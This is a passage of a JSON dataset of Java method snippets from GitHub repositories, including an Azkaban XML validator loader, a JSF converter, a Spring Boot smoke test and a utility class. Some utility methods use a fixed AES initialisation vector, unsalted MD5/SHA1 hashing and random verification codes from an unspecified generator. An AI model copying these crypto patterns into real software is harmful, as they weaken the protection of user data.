"loadValidators", "params": ["Props", "Logger"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void loadValidators(final Props props, final Logger log) {    this.validators = new LinkedHashMap<>();    if (!props.containsKey(ValidatorConfigs.XML_FILE_PARAM)) {      logger.warn(          \"Azkaban properties file does not contain the key \" + ValidatorConfigs.XML_FILE_PARAM);      return;    }    final String xmlPath = props.get(ValidatorConfigs.XML_FILE_PARAM);    final File file = new File(xmlPath);    if (!file.exists()) {      logger.error(\"Azkaban validator configuration file \" + xmlPath + \" does not exist.\");      return;    }    // Creating the document builder to parse xml.    final DocumentBuilderFactory docBuilderFactory = DocumentBuilderFactory.newInstance();    DocumentBuilder builder = null;    try {      // FIXME\u00a0Prevent XML External Entity (XXE) attacks.      XmlResolveUtils.avoidXEE(docBuilderFactory);      builder = docBuilderFactory.newDocumentBuilder();    } catch (final ParserConfigurationException e) {      throw new ValidatorManagerException(          \"Exception while parsing validator xml. Document builder not created.\", e);    }    Document doc = null;    try {      doc = builder.parse(file);    } catch (final SAXException e) {      throw new ValidatorManagerException(\"Exception while parsing \" + xmlPath          + \". Invalid XML.\", e);    } catch (final IOException e) {      throw new ValidatorManagerException(\"Exception while parsing \" + xmlPath          + \". Error reading file.\", e);    }    final NodeList tagList = doc.getChildNodes();    final Node azkabanValidators = tagList.item(0);    final NodeList azkabanValidatorsList = azkabanValidators.getChildNodes();    for (int i = 0; i < azkabanValidatorsList.getLength(); ++i) {      final Node node = azkabanValidatorsList.item(i);      if (node.getNodeType() == Node.ELEMENT_NODE) {        if (node.getNodeName().equals(VALIDATOR_TAG)) {          parseValidatorTag(node, props, log);        }      }    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/validator/XmlValidatorManager.java", "stars": "18", "class": {"name": "XmlValidatorManager", "extends": null, "implements": ["ValidatorManager"], "modifiers": ["public"]}}, {"method_name": "parseValidatorTag", "params": ["Node", "Props", "Logger"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void parseValidatorTag(final Node node, final Props props, final Logger log) {    final NamedNodeMap validatorAttrMap = node.getAttributes();    final Node classNameAttr = validatorAttrMap.getNamedItem(CLASSNAME_ATTR);    if (classNameAttr == null) {      throw new ValidatorManagerException(          \"Error loading validator. The validator 'classname' attribute doesn't exist\");    }    final NodeList keyValueItemsList = node.getChildNodes();    for (int i = 0; i < keyValueItemsList.getLength(); i++) {      final Node keyValuePair = keyValueItemsList.item(i);      if (keyValuePair.getNodeName().equals(ITEM_TAG)) {        parseItemTag(keyValuePair, props);      }    }    final String className = classNameAttr.getNodeValue();    try {      final Class<? extends ProjectValidator> validatorClass =          (Class<? extends ProjectValidator>) validatorLoader.loadClass(className);      final Constructor<?> validatorConstructor =          validatorClass.getConstructor(Logger.class);      final ProjectValidator validator = (ProjectValidator) validatorConstructor.newInstance(log);      validator.initialize(props);      this.validators.put(validator.getValidatorName(), validator);      logger.info(\"Added validator \" + className + \" to list of validators.\");    } catch (final Exception e) {      logger.error(\"Could not instantiate ProjectValidator \" + className);      throw new ValidatorManagerException(e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/validator/XmlValidatorManager.java", "stars": "18", "class": {"name": "XmlValidatorManager", "extends": null, "implements": ["ValidatorManager"], "modifiers": ["public"]}}, {"method_name": "parseItemTag", "params": ["Node", "Props"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void parseItemTag(final Node node, final Props props) {    final NamedNodeMap keyValueMap = node.getAttributes();    final Node keyAttr = keyValueMap.getNamedItem(\"key\");    final Node valueAttr = keyValueMap.getNamedItem(\"value\");    if (keyAttr == null || valueAttr == null) {      throw new ValidatorManagerException(\"Error loading validator key/value \"          + \"pair. The 'key' or 'value' attribute doesn't exist\");    }    props.put(keyAttr.getNodeValue(), valueAttr.getNodeValue());  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/validator/XmlValidatorManager.java", "stars": "18", "class": {"name": "XmlValidatorManager", "extends": null, "implements": ["ValidatorManager"], "modifiers": ["public"]}}, {"method_name": "validate", "params": ["Project", "File"], "throws": null, "modifiers": ["public"], "return_type": "Map<String,ValidationReport>", "snippet": "  public Map<String, ValidationReport> validate(final Project project, final File projectDir) {    final Map<String, ValidationReport> reports = new LinkedHashMap<>();    for (final Entry<String, ProjectValidator> validator : this.validators.entrySet()) {      reports.put(validator.getKey(), validator.getValue().validateProject(project, projectDir));      logger.info(\"Validation status of validator \" + validator.getKey() + \" is \"          + reports.get(validator.getKey()).getStatus());    }    return reports;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/validator/XmlValidatorManager.java", "stars": "18", "class": {"name": "XmlValidatorManager", "extends": null, "implements": ["ValidatorManager"], "modifiers": ["public"]}}, {"method_name": "getValidatorsInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "  public List<String> getValidatorsInfo() {    final List<String> info = new ArrayList<>();    for (final String key : this.validators.keySet()) {      info.add(key);    }    return info;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/validator/XmlValidatorManager.java", "stars": "18", "class": {"name": "XmlValidatorManager", "extends": null, "implements": ["ValidatorManager"], "modifiers": ["public"]}}, {"method_name": "getAsObject", "params": ["FacesContext", "UIComponent", "String"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "\tpublic Object getAsObject(FacesContext context, UIComponent component, String value) {\t\tif (value == null || value.isEmpty()) {\t\t\treturn null;\t\t}\t\treturn dao.buscarPorId(new Long(value));\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/converter/CategoriaConverter.java", "stars": "1", "class": {"name": "CategoriaConverter", "extends": null, "implements": ["Converter"], "modifiers": ["public"]}}, {"method_name": "getAsString", "params": ["FacesContext", "UIComponent", "Object"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getAsString(FacesContext context, UIComponent component, Object value) {\t\tif (value == null) {\t\t\treturn null;\t\t}\t\tCategoria categoria = (Categoria) value;\t\tif (categoria.getId() == null) {\t\t\treturn null;\t\t}// ta dizendo q a categoria \u00e9 representada pelo id\t\treturn categoria.getId().toString();\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/converter/CategoriaConverter.java", "stars": "1", "class": {"name": "CategoriaConverter", "extends": null, "implements": ["Converter"], "modifiers": ["public"]}}, {"method_name": "initialize", "params": ["Context", "StarDriverResult"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initialize(Context context, StarDriverResult result) {        try {            Thread.sleep(100);        } catch (Exception e) {            result.success = false;            result.errorMessage = e.toString();            return;        }        result.success = true;    }", "url": "https://raw.githubusercontent.com/succlz123/StarDriver-APT/master/app/src/main/java/org/succlz123/stardriver/app/task/AppInitImage.java", "stars": "4", "class": {"name": "AppInitImage", "extends": "IStarDriver", "implements": null, "modifiers": ["public"]}}, {"method_name": "queue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Queue", "snippet": "\tpublic Queue queue() {\t\treturn new ActiveMQQueue(\"sample.queue\");\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-activemq/src/main/java/smoketest/activemq/SampleActiveMQApplication.java", "stars": "47572", "class": {"name": "SampleActiveMQApplication", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\t\tSpringApplication.run(SampleActiveMQApplication.class, args);\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-activemq/src/main/java/smoketest/activemq/SampleActiveMQApplication.java", "stars": "47572", "class": {"name": "SampleActiveMQApplication", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "randomNumbers", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "\tpublic static String randomNumbers(int length) {\t\tStringBuilder hash = new StringBuilder(length);\t\tfor (int i = 0; i < length; i++) {\t\t\thash.append(__numberChars.charAt(__random.nextInt(10)));\t\t}\t\treturn hash.toString();\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "randomString", "params": ["int", "boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "\tpublic static String randomString(int length, boolean isLowerCase) {\t\tint size = isLowerCase ? 36 : 62;\t\tStringBuilder hash = new StringBuilder(length);\t\tfor (int i = 0; i < length; i++) {\t\t\thash.append(__randChars.charAt(__random.nextInt(size)));\t\t}\t\treturn hash.toString();\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "randomLong", "params": ["long", "long"], "throws": null, "modifiers": ["public", "static"], "return_type": "long", "snippet": "\tpublic static long randomLong(long min, long max) {\t\treturn min + (long) (Math.random() * (max - min));\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "md5", "params": ["String"], "throws": null, "modifiers": ["public", "final", "static"], "return_type": "String", "snippet": "\tpublic final static String md5(String s) {\t\ttry {\t\t\tbyte[] btInput = s.getBytes();\t\t\tMessageDigest mdInst = MessageDigest.getInstance(\"MD5\");\t\t\tmdInst.update(btInput);\t\t\tbyte[] md = mdInst.digest();\t\t\treturn toHex(md);\t\t} catch (Exception e) {\t\t\te.printStackTrace();\t\t\treturn null;\t\t}\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCheckcode", "params": ["int"], "throws": null, "modifiers": ["public", "final", "static"], "return_type": "String", "snippet": "\tpublic final static String getCheckcode(int length){\t\tint size = __diffChars.length();\t\tStringBuilder hash = new StringBuilder(length);\t\tfor (int i = 0; i < length; i++) {\t\t\thash.append(__diffChars.charAt(__random.nextInt(size)));\t\t}\t\treturn hash.toString();\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getMsgcode", "params": ["int"], "throws": null, "modifiers": ["public", "final", "static"], "return_type": "String", "snippet": "\tpublic final static String getMsgcode(int length){\t\treturn randomNumbers(length);\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "randomInt", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "\tpublic static int randomInt(int min, int max) {\t\treturn min + (int) (Math.random() * (max - min));\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "FNVHash1", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "    public static int FNVHash1(String data){           final int p = 16777619;           int hash = (int)2166136261L;        for(int i=0;i<data.length();i++)               hash = (hash ^ data.charAt(i)) * p;        hash += hash << 13;           hash ^= hash >> 7;           hash += hash << 3;           hash ^= hash >> 17;           hash += hash << 5;        return hash;       }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "hashNum", "params": ["String", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String hashNum(String data, int range){    \tCRC32 crc32 = new CRC32();    \tcrc32.update(data.getBytes());    \tlong hash = crc32.getValue();    \thash = hash % range; \t\treturn String.valueOf(hash);    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "hashTableId", "params": ["String", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String hashTableId(String data, int range){    \tCRC32 crc32 = new CRC32();    \tcrc32.update(data.getBytes());    \tlong hash = crc32.getValue();    \thash = hash % range + 1; \t\treturn String.valueOf(hash);    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "hashTableId", "params": ["long", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String hashTableId(long data, int range){    \tlong hash = (data % range + 1);    \treturn String.valueOf(hash);    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getHmacSHA1Encrypt", "params": ["String", "String"], "throws": ["Exception"], "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getHmacSHA1Encrypt(String encryptText, String encryptKey) throws Exception {                   byte[] keyBytes = encryptKey.getBytes(ENCODING_UTF8);        byte[] textBytes = encryptText.getBytes(ENCODING_UTF8);        SecretKey secretKey = new SecretKeySpec(keyBytes, \"HmacSHA1\");        Mac mac = Mac.getInstance(\"HmacSHA1\");           mac.init(secretKey);        return new String(Base64.getEncoder().encodeToString(mac.doFinal(textBytes)));      }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toHex", "params": ["byte"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "\tprivate static String toHex(byte[] src) {\t\tint len = src.length;\t\tchar[] chs = new char[len * 2];\t\tint j = 0;\t\tfor (int i = 0; i < len; i++) {\t\t\tchs[j++] = hexDigits[src[i] >> 4 & 0xF];\t\t\tchs[j++] = hexDigits[src[i] >> 0 & 0xF];\t\t}\t\treturn new String(chs);\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "encodeBySHA1", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "\tpublic static String encodeBySHA1(String str) {\t\ttry{\t\t\tMessageDigest sha1 = MessageDigest.getInstance(\"SHA1\");\t\t\tsha1.update(str.getBytes()); \t\t\tbyte[] digest = sha1.digest();\t\t\treturn toHex(digest);\t\t}catch(Exception e){\t\t\treturn null;\t\t}\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "encryptAESData", "params": ["String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "\tpublic static String encryptAESData(String privateKey, String text) {\t   try{\t\t  SecretKeySpec secretKey = new SecretKeySpec(privateKey.getBytes(ENCODING_UTF8), \"AES\");\t\t  Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\t\t  byte[] initParam = IV_STRING.getBytes(ENCODING_UTF8);\t\t  IvParameterSpec ivParameterSpec = new IvParameterSpec(initParam);\t\t  cipher.init(Cipher.ENCRYPT_MODE, secretKey, ivParameterSpec);  \t\t  return Base64.getEncoder().encodeToString(cipher.doFinal(text.getBytes(ENCODING_UTF8)));\t   } catch (Exception e) {\t\t   e.printStackTrace();\t   }\t   return text;\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "decryptAESData", "params": ["String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "\tpublic static String decryptAESData(String privateKey, String encryptText) {\t   try{\t\t  SecretKeySpec secretKey = new SecretKeySpec(privateKey.getBytes(ENCODING_UTF8), \"AES\");\t\t  Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\t\t  byte[] initParam = IV_STRING.getBytes(ENCODING_UTF8);\t\t  IvParameterSpec ivParameterSpec = new IvParameterSpec(initParam);\t\t  cipher.init(Cipher.DECRYPT_MODE, secretKey, ivParameterSpec);\t\t  return new String(cipher.doFinal(Base64.getDecoder().decode(encryptText)), ENCODING_UTF8);\t   }catch (Exception e){\t\t   e.printStackTrace();\t   }\t   return null;\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "checkPhoneNo", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean checkPhoneNo(String phoneno){\t\tPattern pattern = Pattern.compile(\"^(1[0-9]{10})$\");\t\tMatcher matcher = pattern.matcher(phoneno);\t\treturn matcher.matches();\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getYMDTHMSZ", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getYMDTHMSZ(){\t\tfinal SimpleDateFormat df = new SimpleDateFormat(YYYY_MM_DD_T_HH_MM_SS_Z);\t\tdf.setTimeZone(new SimpleTimeZone(0, \"GMT\"));\t\treturn df.format(new Date(System.currentTimeMillis()));\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCurrentYMDHMS", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getCurrentYMDHMS(){\t\tfinal SimpleDateFormat df = new SimpleDateFormat(YYYY_MM_DD_HH_MM_SS);\t\treturn df.format(new Date(System.currentTimeMillis()));\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCurrentYMDHMS", "params": ["long"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getCurrentYMDHMS(long millis){\t\tfinal SimpleDateFormat df = new SimpleDateFormat(YYYY_MM_DD_HH_MM_SS);\t\treturn df.format(new Date(millis));\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCurrentYMDHM", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getCurrentYMDHM(){\t\tfinal SimpleDateFormat df = new SimpleDateFormat(YYYY_MM_DD_HH_MM);\t\treturn df.format(new Date(System.currentTimeMillis()));\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCurrentYMDHM", "params": ["long"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getCurrentYMDHM(long millis){\t\tfinal SimpleDateFormat df = new SimpleDateFormat(YYYY_MM_DD_HH_MM);\t\treturn df.format(new Date(millis));\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCurrentYMDHMSS", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getCurrentYMDHMSS(){\t\tfinal SimpleDateFormat df = new SimpleDateFormat(YYYYMMDDHHMMSSSSS);\t\treturn df.format(new Date(System.currentTimeMillis()));\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCurrentYMDHMSS2", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getCurrentYMDHMSS2(){\t\tfinal SimpleDateFormat df = new SimpleDateFormat(YYMMDDHHMMSSSSS);\t\treturn df.format(new Date(System.currentTimeMillis()));\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCurrentYMDHMS2", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getCurrentYMDHMS2(){\t\tfinal SimpleDateFormat df = new SimpleDateFormat(YYYYMMDDHHMMSS);\t\treturn df.format(new Date(System.currentTimeMillis()));\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getTodayYMD", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getTodayYMD(){\t\tfinal SimpleDateFormat df = new SimpleDateFormat(YYYY_MM_DD);\t\treturn df.format(new Date(System.currentTimeMillis()));\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCurrentYMDH2", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getCurrentYMDH2(){\t\tfinal SimpleDateFormat df = new SimpleDateFormat(YYYYMMDDHH);\t\treturn df.format(new Date(System.currentTimeMillis()));\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCurrentYMDHM2", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getCurrentYMDHM2(){\t\tfinal SimpleDateFormat df = new SimpleDateFormat(YYYYMMDDHHMM);\t\treturn df.format(new Date(System.currentTimeMillis()));\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getTodayYMD2", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getTodayYMD2(){\t\tfinal SimpleDateFormat df = new SimpleDateFormat(YYYYMMDD);\t\treturn df.format(new Date(System.currentTimeMillis()));\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAfterDaysYMD", "params": ["int", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getAfterDaysYMD(int days, String startDate){    \tString endDate = null;    \ttry{    \t\tSimpleDateFormat format = new SimpleDateFormat(YYYY_MM_DD);    \t\tCalendar calendar = Calendar.getInstance();    \t\tif(startDate != null){    \t\t\tDate date = format.parse(startDate);        \t\tcalendar.setTime(date);    \t\t}    \t\tcalendar.add(Calendar.DATE, days);        \tendDate = format.format(calendar.getTime());    \t}catch(Exception e){    \t}    \treturn endDate;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAfterMonthsYMD", "params": ["int", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getAfterMonthsYMD(int months, String startDate){    \tString endDate = null;    \ttry{    \t\tSimpleDateFormat format = new SimpleDateFormat(YYYY_MM_DD);    \t\tCalendar calendar = Calendar.getInstance();    \t\tif(startDate != null){    \t\t\tDate date = format.parse(startDate);        \t\tcalendar.setTime(date);    \t\t}    \t\tcalendar.add(Calendar.MONTH, months);        \tendDate = format.format(calendar.getTime());    \t}catch(Exception e){    \t}    \treturn endDate;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAfterMonthsYM", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "\tpublic static String getAfterMonthsYM(int months){\t\tString endDate = null;\t\ttry{\t\t\tSimpleDateFormat format = new SimpleDateFormat(YYYY_MM);\t\t\tCalendar calendar = Calendar.getInstance();\t\t\tcalendar.add(Calendar.MONTH, months);\t\t\tendDate = format.format(calendar.getTime());\t\t}catch(Exception e){\t\t}\t\treturn endDate;\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAfterMinutesYMDHMS", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "\tpublic static String getAfterMinutesYMDHMS(int minutes){\t\tString endDate = null;\t\ttry{\t\t\tSimpleDateFormat format = new SimpleDateFormat(YYYY_MM_DD_HH_MM_SS);\t\t\tCalendar calendar = Calendar.getInstance();\t\t\tcalendar.add(Calendar.MINUTE, minutes);\t\t\tendDate = format.format(calendar.getTime());\t\t}catch(Exception e){\t\t}\t\treturn endDate;\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAfterDaysYMD", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getAfterDaysYMD(int days){    \tString endDate = null;    \ttry{    \t\tSimpleDateFormat format = new SimpleDateFormat(YYYY_MM_DD);    \t\tCalendar calendar = Calendar.getInstance();    \t\tcalendar.add(Calendar.DATE, days);        \tendDate = format.format(calendar.getTime());    \t}catch(Exception e){    \t}    \treturn endDate;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getDaysBetweenDates", "params": ["String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "long", "snippet": "    public static long getDaysBetweenDates(String ymdhm1, String ymdhm2){    \ttry{    \t\tCalendar calendar = Calendar.getInstance();    \t\tSimpleDateFormat format = new SimpleDateFormat(YYYY_MM_DD_HH_MM);    \t\tDate date1 = format.parse(ymdhm1);    \t\tDate date2 = format.parse(ymdhm2);    \t\tcalendar.setTime(date1);    \t\tlong time1 = calendar.getTimeInMillis();    \t\tcalendar.setTime(date2);    \t\tlong time2 = calendar.getTimeInMillis();    \t\treturn Math.abs((time1-time2)/86400000);    \t}catch(Exception e){    \t}    \treturn 0;    }", "url": 